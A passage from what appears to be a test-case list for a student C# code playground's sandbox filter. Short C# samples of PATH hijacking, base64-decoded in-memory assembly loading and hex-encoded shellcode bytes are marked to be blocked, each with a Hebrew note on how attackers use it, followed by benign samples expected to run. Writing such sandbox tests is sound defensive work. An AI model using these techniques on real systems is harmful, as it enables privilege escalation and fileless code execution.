    `,
  },
  {
    name: 'C#: Environment.SetEnvironmentVariable',
    code: `class Program {
  static void Main() {
    System.Environment.SetEnvironmentVariable("PATH", "/tmp:/bin");
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 התקפה: השתלטות על PATH

      איך תוקפים משתמשים בזה:
      שינוי PATH גורם להרצות תהליכים בהמשך לבחור בינארי זדוני
      שהתוקף שתל - תבנית privilege escalation קלאסית של
      PATH injection.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ENCODING BYPASS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Convert.FromBase64String → Assembly.Load',
    code: `using System.Reflection;
class Program {
  static void Main() {
    var b = System.Convert.FromBase64String("TVqQAAMAAAA=");
    Assembly.Load(b);
  }
}`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 התקפה: Payload מקודד Base64 בזיכרון

      איך תוקפים משתמשים בזה:
      קידוד assembly זדוני כ־base64 מסתיר אותו מסורקי byte-pattern
      נאיביים. בזמן הריצה הוא מפוענח ונטען עם Assembly.Load מתוך
      הזיכרון - RCE ללא קובץ.
    `,
  },
  {
    name: 'C#: BitConverter / hex decode',
    code: `class Program {
  static void Main() {
    var s = System.BitConverter.ToString(new byte[]{0x90,0x90,0xc3});
  }
}`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 התקפה: עזר ל־Payload מקודד Hex

      איך תוקפים משתמשים בזה:
      BitConverter משולב לעיתים עם Convert.FromHexString כדי
      להבריח bytes של shellcode דרך ערוצים שמקבלים רק מחרוזות,
      כמו logs, query strings ועוד.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Safe print',
    code: `class Program {
  static void Main() {
    System.Console.WriteLine("Hello, World!");
  }
}`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פלט Console בסיסי

      Hello World קלאסי. זה חייב לרוץ בהצלחה כדי שהתלמידים באמת
      יוכלו להשתמש ב־playground.
    `,
  },
  {
    name: 'C#: Safe math',
    code: `class Program {
  static void Main() {
    System.Console.WriteLine(2 + 2);
  }
}`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: חישוב חשבוני בסיסי

      מתמטיקה פשוטה ללא תופעות לוואי.
    `,
  },
  {
    name: 'C#: Safe class',
    code: `class Point {
  public int X, Y;
  public Point(int x, int y) { X = x; Y = y; }
  public int Sum() => X + Y;
}
class Program {
  static void Main() {
    var p = new Point(3, 4);
    System.Console.WriteLine(p.Sum());
  }
}`,
    expectBlocked: false,
    expectedOutput: '7',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: OOP - מחלקה + constructor + מתודה

      קוד מונחה־עצמים סטנדרטי בלי APIs מסוכנים.
    `,
  },
  {
    name: 'C#: Safe LINQ',
    code: `using System.Linq;
class Program {
  static void Main() {
    var xs = new[]{1,2,3,4};
    System.Console.WriteLine(xs.Sum());
  }
}`,
    expectBlocked: false,
    expectedOutput: '10',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: Aggregation עם LINQ

      System.Linq הוא כלי לטרנספורמציה של נתונים בלבד - ללא I/O,
      ללא reflection וללא קוד native.
    `,
  },
  {
    name: 'C#: Safe top-level',
    code: `System.Console.WriteLine("top-level");`,
    expectBlocked: false,
    expectedOutput: 'top-level',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: Top-Level Statements ב־C# 9

      צורת entry point מודרנית של C# - חייבת להיות נתמכת.
    `,
  },
];
